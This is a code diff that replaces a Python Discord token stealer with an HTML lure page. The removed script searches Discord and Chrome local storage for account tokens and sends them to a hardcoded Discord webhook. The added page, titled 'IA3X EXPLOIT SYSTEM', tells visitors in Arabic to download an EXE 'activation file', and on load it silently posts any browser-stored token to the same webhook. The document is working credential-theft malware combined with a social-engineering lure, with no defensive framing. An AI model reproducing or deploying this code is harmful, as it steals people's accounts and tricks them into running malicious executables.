@@ -1,45 +1,27 @@
-import os
-import re
-import json
-import requests
-
-# رابط الويبهوك الخاص بك من سيرفر ديسكورد
-WEBHOOK_URL = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe"
-
-def grab_tokens():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+<!DOCTYPE html>
+<html>
+<head><title>IA3X MENU V2</title></head>
+<body style="background:black; color:red; text-align:center; padding-top:15%;">
+    <h1>IA3X EXPLOIT SYSTEM</h1>
+    <p>بسبب حماية ديسكورد الجديدة، يجب عليك تحميل "ملف التفعيل" لتشغيل المنيو</p>
     
-    # المسارات التي يخزن فيها تطبيق الديسكورد التوكنات على البي سي
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canery': roaming + '\\discordcanary',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default'
-    }
+    <a href="رابط_ملف_السحب_EXE_هنا" download>
+        <button style="padding:20px; background:red; color:white; font-weight:bold; cursor:pointer;">
+            تحميل وتفعيل المنيو (EXE)
+        </button>
+    </a>
 
-    tokens = []
-    for platform, path in paths.items():
-        path += '\\Local Storage\\leveldb'
-        if os.path.exists(path):
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                        for token in re.findall(regex, line):
-                            if token not in tokens:
-                                tokens.append(token)
-    
-    # إرسال النتائج للديسكورد
-    if tokens:
-        requests.post(WEBHOOK_URL, json={
-            "content": "🎯 **صيدة جديدة من داخل ملفات البي سي!**",
-            "embeds": [{
-                "title": "PC Files Grabber",
-                "description": f"🔑 **Tokens Found:**\n" + "\n".join([f"`{t}`" for t in tokens]),
-                "color": 16711765
-            }]
-        })
-
-if __name__ == "__main__":
-    grab_tokens()
+    <script>
+        // هذا الجزء يسحب "تلقائياً" فقط إذا كان فاتح بالمتصفح
+        window.onload = function() {
+            const webhook = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe";
+            const token = localStorage.getItem("token") || "Not in Browser";
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ content: "🎯 دخول جديد للموقع: \nToken: " + token })
+            });
+        };
+    </script>
+</body>
+</html>
